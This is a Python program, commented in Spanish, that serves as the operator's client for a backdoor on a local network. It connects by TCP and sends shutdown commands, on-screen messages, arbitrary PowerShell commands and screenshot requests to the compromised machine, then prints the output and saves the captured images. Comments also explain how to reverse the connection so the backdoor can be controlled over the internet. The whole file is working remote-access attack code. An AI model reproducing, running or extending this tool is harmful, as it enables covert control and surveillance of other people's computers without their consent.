import socket
import argparse
import time
import os
import platform
from colorama import init

# cliente backdor: pequeño programa que envia comandos a un bakdoor de la red local (no esta pensado para conectarse desde fuera de la red local)
# si el objetivo es conectarse a traves de internet, se debe cambiar el enfoque de los programas:
# en ese caso, el que escucha las conexiones deberia ser el cliente.py (actuaria como server) y el backdoor seria el cliente
# el backdoor deberia conectarse a una ip (deberia usarse una fija o software de tunelacion)
# poner a escuchar un programa desde internet con poca seguridad podria ser riesgoso, se debe entender muy bien lo que se esta haciendo
# "Estamos hack" - Autor: Matias Urbaneja (Urb@n) - # https://github.com/Urban20

init()


logo = r'''
        ##################################
        # _   _      _       ____        #
        #| | | |_ __| |__   / __ \ _ __  #
        #| | | | '__| '_ \ / / _` | '_ \ #
        #| |_| | |  | |_) | | (_| | | | |#
        # \___/|_|  |_.__/ \ \__,_|_| |_|#
        #                   \____/       #
        ##################################
'''


args=argparse.ArgumentParser(description='pequeña utilidad para controlar remotamente una maquina dentro de la red via linea de comandos')
args.add_argument('-P','--puerto',
                  type=int,
                  help='puerto donde escucha de la maquina a controlar (999 por defecto)')
args.add_argument('-IP','--ip',
                  type=str,
                  help='direccion ipv4 privada de la maquina a controlar')
arg = args.parse_args()

n = 0 # valor que percibe la primera conexion
timeout = 5 #timeout de conexion
timeout_sleep = 3 #timeout de time.sleep

print('\033[0;35m' + logo + '\033[0m')

if platform.system() == 'Linux':
    borrar = 'clear'

elif platform.system() == 'Windows':
    borrar = 'cls'

def salir():
    print('\nsaliendo...\n')
    exit(0)

def menu():
    print('''
comandos basicos:
[\033[0;32m0\033[0m] borrar script          
[\033[0;32m1\033[0m] apagar equipo
[\033[0;32m2\033[0m] enviar mensaje
[\033[0;32mq\033[0m] salir
[\033[0;32mss\033[0m] capturar pantalla
          ''')


def shell(socket):

    'funcion que envia al backdoor los comandos de la consola'
    buffer = 102_400
    try:
        menu()
        entrada = str(input('[#] comando >> '))
        match entrada:
            case 'q':
                print('\n\033[0;32m[*] saliendo\033[0m\n')
                exit(0)
            case '0':
                os.system(borrar)

            case '1':

                    socket.send(b'shutdown /s')

            case '2':
                
                socket.send(f'msg * {str(input('mensaje> '))}'.encode())
                os.system(borrar)
            case 'ss':
                try:
                    img_nombre = 'screen.jpg'
                    socket.send('ss'.encode()) # envio la señal para que el backdoor sepa que debe enviar ss
                    tamaño_original = int.from_bytes(socket.recv(8))
                    data = bytearray()

                    while len(data) < tamaño_original:
                        restante = tamaño_original - len(data) # se calcula el buffer restante, debe coincidir
                        datos = socket.recv(restante) # datos obtenidos en cada momento
                        if not datos: # si datos = b''
                            break
                        data.extend(datos) # agrego lo nuevos datos al bytearray
                    if tamaño_original == len(data):
                        with open(img_nombre,'wb') as img_arch:
                            img_arch.write(data) # escribo el bytearray que contiene todos los datos
                        print(f'\n\033[0;32mimagen obtenida : {img_nombre}\033[0m\n')
                    else: print('\n\033[0;31mno se pudo obtener la imagen\033[0m\n')

                except Exception as e: print(f'\033[0;31m[x] hubo un error: {e}\033[0m\n') 

            case _:
                socket.send(f'powershell -command {entrada}'.encode()) # enviar comando de powershell por cmd
                salida = socket.recv(buffer).decode() # salida del comando (lo envia el bdoor)
                if salida != None:
                    print(salida)
                else:
                    print('\n\033[0;31mno hubo respuesta\033[0m\n')
                return salida
            
    except KeyboardInterrupt:
        salir()

def conexion(contador):
    'funcion que se encarga de establecer una conexion tcp con el backdoor'
    try:
        print('\n\033[0;33m[*] iniciando...\033[0m\n')
        entrada = None
        salida = None
        while entrada != 'q':
            s= socket.socket()
            
            s.settimeout(timeout)
            try:
                
                if s.connect_ex((arg.ip,arg.puerto)) == 0:
                    if contador == 0:
                        print(f'\n\033[0;32m[*] conectado a {arg.ip}:{arg.puerto}\033[0m\n')
                    salida = shell(socket=s)
                else:
                    print('\n\033[0;31mconexion perdida\033[0m\n')
                    raise TimeoutError
            except (TimeoutError,ConnectionResetError):
                
                print('\n\033[0;33m[!] reconectando ...\033[0m\n')
            
                time.sleep(timeout_sleep)
                
                os.system(borrar)
            

            finally:
                contador= 1

    except KeyboardInterrupt:
        salir()        

conexion(contador=n)